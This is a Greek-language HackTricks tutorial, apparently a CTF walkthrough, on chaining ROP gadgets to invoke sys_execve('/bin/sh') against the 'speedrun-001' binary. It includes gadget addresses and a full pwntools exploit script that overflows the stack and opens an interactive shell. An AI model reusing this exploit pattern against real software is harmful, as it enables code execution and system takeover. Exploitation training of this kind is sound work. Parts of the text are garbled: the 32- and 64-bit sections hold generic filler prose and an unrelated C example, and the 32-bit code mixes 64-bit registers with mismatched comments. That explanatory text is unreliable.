# ROP - κλήση sys_execve

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

Για να προετοιμάσουμε την κλήση για το **syscall** απαιτείται η παρακάτω διαμόρφωση:

* `rax: 59 Καθορίζει το sys_execve`
* `rdi: δείκτης στο "/bin/sh" καθορίζει το αρχείο που θα εκτελεστεί`
* `rsi: 0 καθορίζει ότι δεν περνιούνται παράμετροι`
* `rdx: 0 καθορίζει ότι δεν περνιούνται μεταβλητές περιβάλλοντος`

Ουσιαστικά, απαιτείται να γράψουμε το string `/bin/sh` κάπου και στη συνέχεια να εκτελέσουμε το `syscall` (λαμβάνοντας υπόψη το padding που απαιτείται για τον έλεγχο του stack).

## Έλεγχος των καταχωρητών

Ας ξεκινήσουμε βρίσκοντας **πώς να ελέγξουμε αυτούς τους καταχωρητές**:
```c
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
Με αυτές τις διευθύνσεις είναι δυνατόν να **γραφεί το περιεχόμενο στο stack και να φορτωθεί στους καταχωρητές**.

## Γράψτε συμβολοσειρά

### Εγγράψιμη μνήμη

Πρώτα πρέπει να βρείτε ένα εγγράψιμο μέρος στη μνήμη
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### Εγγραφή Συμβολοσειράς

Στη συνέχεια, πρέπει να βρείτε έναν τρόπο να εγγράψετε αυθαίρετο περιεχόμενο σε αυτήν τη διεύθυνση.
```python
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
#### 32 bits

Οι επιθέσεις ROP (Return-Oriented Programming) είναι μια τεχνική εκμετάλλευσης που χρησιμοποιείται για να εκτελέσει κώδικα σε ένα πρόγραμμα, ανακατευθύνοντας τη ροή εκτέλεσης σε υπάρχοντες κώδικες (gadgets). Στην περίπτωση των 32-bit συστημάτων, οι διευθύνσεις μνήμης είναι 4-byte (32-bit) και οι διευθύνσεις επιστροφής (return addresses) αποθηκεύονται στη στοίβα (stack).

Για να εκτελέσουμε μια επίθεση ROP, πρέπει να βρούμε κατάλληλους gadgets που να περιέχουν τον κώδικα που θέλουμε να εκτελέσουμε. Οι gadgets αυτοί αποτελούνται από ακολουθίες εντολών που τελειώνουν με μια εντολή `ret` (return). Κατά την εκτέλεση της επίθεσης, αντικαθιστούμε τις διευθύνσεις επιστροφής στη στοίβα με τις διευθύνσεις των gadgets που θέλουμε να εκτελέσουμε.

Ένας τρόπος για να εκτελέσουμε κώδικα με τη χρήση της τεχνικής ROP είναι να χρησιμοποιήσουμε τη συνάρτηση `execv()`. Η `execv()` είναι μια συνάρτηση του συστήματος που εκτελεί ένα πρόγραμμα από ένα αρχείο. Για να εκτελέσουμε τη συνάρτηση `execv()` με τη χρήση της τεχνικής ROP, πρέπει να βρούμε τη διεύθυνση της στον κώδικα του προγράμματος και να την αντικαταστήσουμε στη στοίβα.

Αφού έχουμε εντοπίσει τη διεύθυνση της συνάρτησης `execv()` στον κώδικα, πρέπει να βρούμε τις απαιτούμενες παραμέτρους για την εκτέλεση της. Οι παράμετροι αυτές πρέπει να αποθηκευτούν στη στοίβα με τη σωστή σειρά, πριν από την εκτέλεση της συνάρτησης.

Με τη χρήση της τεχνικής ROP και της συνάρτησης `execv()`, μπορούμε να εκτελέσουμε κώδικα από ένα αρχείο σε ένα πρόγραμμα, εκμεταλλευόμενοι τις ευπάθειες του συστήματος.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64 bits

Τα 64 bits

Τα 64 bits αναφέρονται στην αρχιτεκτονική ενός συστήματος υπολογιστή που χρησιμοποιεί 64-bit εγγραφές για την αναπαράσταση δεδομένων και εντολών. Αυτό σημαίνει ότι οι εγγραφές μπορούν να αποθηκεύσουν μεγαλύτερες τιμές και να υποστηρίξουν περισσότερη μνήμη από τα 32-bit συστήματα.

Στον χώρο του hacking, η αντίληψη της αρχιτεκτονικής 64 bits είναι σημαντική καθώς επηρεάζει την εκτέλεση επιθέσεων και την εκμετάλλευση ευπαθειών σε συστήματα Linux. Οι επιθέσεις που αξιοποιούν την αρχιτεκτονική 64 bits απαιτούν τη χρήση τεχνικών όπως η ROP (Return-Oriented Programming) και η ανάκτηση κώδικα (code reuse) για να εκτελέσουν κακόβουλο κώδικα σε ένα σύστημα.

Για να εκμεταλλευτείτε μια ευπάθεια σε ένα σύστημα Linux με αρχιτεκτονική 64 bits, θα πρέπει να κατανοήσετε την ανατροπή της εκτέλεσης (execution hijacking), την ανάκτηση κώδικα (code reuse) και τη χρήση της ROP (Return-Oriented Programming) για να εκτελέσετε κακόβουλο κώδικα. Αυτές οι τεχνικές επιτρέπουν στον επιτιθέμενο να εκμεταλλευτεί τις ευπαθείς συνθήκες του συστήματος και να αποκτήσει ανεξέλεγκτη πρόσβαση σε αυτό.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## Παράδειγμα

```c
#include <stdio.h>
#include <unistd.h>

int main() {
    char *args[] = {"/bin/sh", NULL};
    execv(args[0], args);
    return 0;
}
```

Στο παραπάνω παράδειγμα, έχουμε ένα απλό πρόγραμμα C που εκτελεί το `/bin/sh` shell. Η συνάρτηση `execv` χρησιμοποιείται για να εκτελέσει το shell με τη χρήση των ορισμάτων που περνάμε σε αυτήν. Στην περίπτωση αυτή, το πρόγραμμα εκτελεί το `/bin/sh` χωρίς κανένα επιπλέον όρισμα.
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
## Αναφορές

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
